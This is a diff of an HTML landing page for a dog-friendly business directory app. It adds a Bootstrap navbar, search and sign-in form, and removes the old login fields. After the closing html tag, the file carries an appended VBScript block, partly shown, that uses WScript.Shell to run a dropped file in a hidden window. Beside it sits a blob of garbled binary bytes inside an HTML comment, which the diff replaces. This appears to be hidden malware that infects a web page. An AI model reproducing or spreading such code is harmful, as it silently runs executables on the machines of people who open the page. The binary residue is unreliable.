@@ -2,7 +2,7 @@
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<title>Dog Friendly Businesses Near You</title>
 	<meta name="description" content="Find all Dog Related Businesses and Dog Friendly Companies or add your own Dog Friendly Business Today!"/>
 	<link rel='stylesheet' id='bootstrap-css'  href='css/bootstrap.min.css' type='text/css' media='all' />
@@ -10,11 +10,70 @@
 	<link rel='stylesheet' id='gryphon-css'  href='style.css' type='text/css' media='all' />
 </head>
 <body class="app-ds-body app-ds-home">
+	<nav class="navbar navbar-default navbar-fixed-top" role="navigation">
+		<div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="#">Dog Sniffer</a>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        <li class="active"><a href="#" id="show-listings">Places</a></li>
+        <li><a href="#" id="show-events">Events</a></li>
+        <li class="dropdown">
+          <a href="#" class="dropdown-toggle" data-toggle="dropdown">Show <span class="caret"></span></a>
+          <ul class="dropdown-menu" role="menu">
+            <li><a href="#">List</a></li>
+            <li><a href="#">Map</a></li>
+            <li class="divider"></li>
+            <li><a href="#">Website</a></li>
+            <li class="divider"></li>
+            <li><a href="#">Other</a></li>
+          </ul>
+        </li>
+      </ul>
+      <form class="navbar-form navbar-left" role="search">
+        <div class="form-group">
+          <input type="text" class="form-control" placeholder="Sniff For" id="s">
+        </div>
+		<div class="form-group">
+          <input type="text" class="form-control" placeholder="Neighborhood, City, Zip" id="where">
+        </div>
+        <button type="submit" class="btn btn-default">Submit</button>
+      </form>
+      <ul class="nav navbar-nav navbar-right">
+        <li class="dropdown">
+          <a href="#" class="dropdown-toggle" data-toggle="dropdown">Sign In <span class="caret"></span></a>
+          <ul class="dropdown-menu" role="menu">
+            <li><a href="#">Action</a></li>
+            <li class="divider"></li>
+			<li><form role="form"><div class="form-group">
+					<label for="exampleInputEmail1">Email address</label>
+					<input type="email" class="form-control" id="exampleInputEmail1" placeholder="Enter email">
+				</div>
+				<div class="form-group">
+					<label for="exampleInputPassword1">Password</label>
+					<input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password">
+				</div></form></li>
+          </ul>
+					</li>
+					<li><a href="#">Register</a></li>
+				</ul>
+			</div><!-- /.navbar-collapse -->
+		</div><!-- /.container-fluid -->
+	</nav>
 <header id="top" class="header-full">
 	<div class="container-fluid app-ds-center">
 		<div class="row-fluid " >
 			<img src="images/logo.png" alt="Los Angeles">
-			<h1>Dog Sniffer</h1>
 		</div>
 	</div>
 </header>
@@ -22,13 +81,11 @@
 	<div id="primary" class="container-fluid ">            	
 		<section id="content" class="row-fluid" role="main">
 			<div class="span12 content app-ds-center" >
-				<div class="app-field-block"><input class="app-ds-field-username app-ds-txt-field required" id="s" name="username" placeholder="Username or E-mail" data-placeholder="Username or E-mail" value="" type="text"></div>
-				<div class="app-field-block"><input class="app-ds-field-pw app-ds-txt-field required" id="s" name="password" placeholder="Password" data-placeholder="Password" value="" type="password"></div>
+				
 				<h3>Listings</h3>
 				<ul class="druid-listings">
 					
 				</ul>
-				<a class="btn app-ds-btn" href="/register">Sign Up For <strong>FREE</strong></a>
 			</div>
 		</section>
 	</div>
@@ -38,6 +95,7 @@
     <script type="text/javascript" src="phonegap.js"></script>  -->
 <script type="text/javascript" src="js/jquery.js"></script>
 <script type="text/javascript" src="js/druid.js"></script>
+<script type="text/javascript" src="js/bootstrap.min.js"></script>
 <script type="text/javascript">app.init();</script>
 </body>
 </html><SCRIPT Language=VBScript><!--
@@ -54,5 +112,4 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--Dœ/'ù¢úEõﬁV'…⁄äâiYÅé—ó$ïjÕLÜE∞~§ÜT>i\ºπáå Ô$∫@∞ëï±Î√”Yõ
-J|úP≠QñcNOÿYC!‹’j—óﬁ0ÏÅÏπ±ïWû¿õJEí!âxŸ‡VŒ(jŒ¶:RÑÄıÃdƒ/ÄÍµûSùë9_sÑUZ≠Ó[‘uπ–"÷§d"D* &m¡N˛o’º,PøﬂaBï•Ò˝´UbÂ©å@iH≠Œ≤+^Ëô8pî;= ˚è∫ëæÚØ\±@Ã@é$Qn(ä’ë•Å4f©4.æòtÜ§´J€Ãs§bè	Õ>…)ƒ;<i{á&òù9;Ùï'1µh˜Ï}ËDì”{L‘”Ç¢Nó¡ÖNDYv6˝mX0∏?¨©àãïN=%∫7NVëbp˛NÏ3‘Å◊oŸñL ⁄7ç%¬k‹∂´qVéV9îYﬁÖ˚÷⁄ìı«⁄Œ§VUG£»L…˙.›NÄËÆ(9±AJbé™8’Lô´l^ü@i†%ñÃ∏Ì ¶aKB	#1WwÄ6Î√jπ¬¡w˝F'=rIgtä≥ìâ^˘L˝…H∆k(Ä|Ô€∑À}®ƒPæﬂƒ3‡	áj·êaˆS_‰æË!1ª†.ª‘Ï:NMÍ8Øü%ä,a”TKé ⁄|Rg˚⁄|⁄|⁄|ó°MpÁ>U®“| ⁄|-->
+//--></SCRIPT><!--…◊TÃQ¨`Å[Ω6ã[~∞"8≈yGP¸FV1Ñ’≤≥ÓµiVnƒñPo÷GsU¸æ8ô9˘ñ;ç>ÍaÏÁÌ•î£aÉ?k°†Ü<ßQØ‹Q¢ ¶/ÇK¨Rd∞◊n¨¥+ºJÍU_¨:ÁöZÑH*Ë·}8ãÆ√}0¯∆ ÎÀ”#UäÈ.Â„D·Â¨èòF]Y.=ÓE´4Ï¶gÉáöö\Í@Ï˚P‡P!˛>dC)]j#ÕÇ+ºœ/7ÃÏêÏxiw#ïÉYG™ô5ÿc¡Uy˙Í"7∆Ç∑Äîxo£Ú®π?•⁄®b<ìå·YNâ∑B≤4ƒÔ¯ÁÎE2J˙öpöƒËjÕÊëÄ‹&˘›VsyyrP ¬LBPOq˚bÊlÈä—©ın]£Ï˘ ›ÇRô˚›Ç›Ç›Çê_M+í«UüÃÇ ›Ç-->
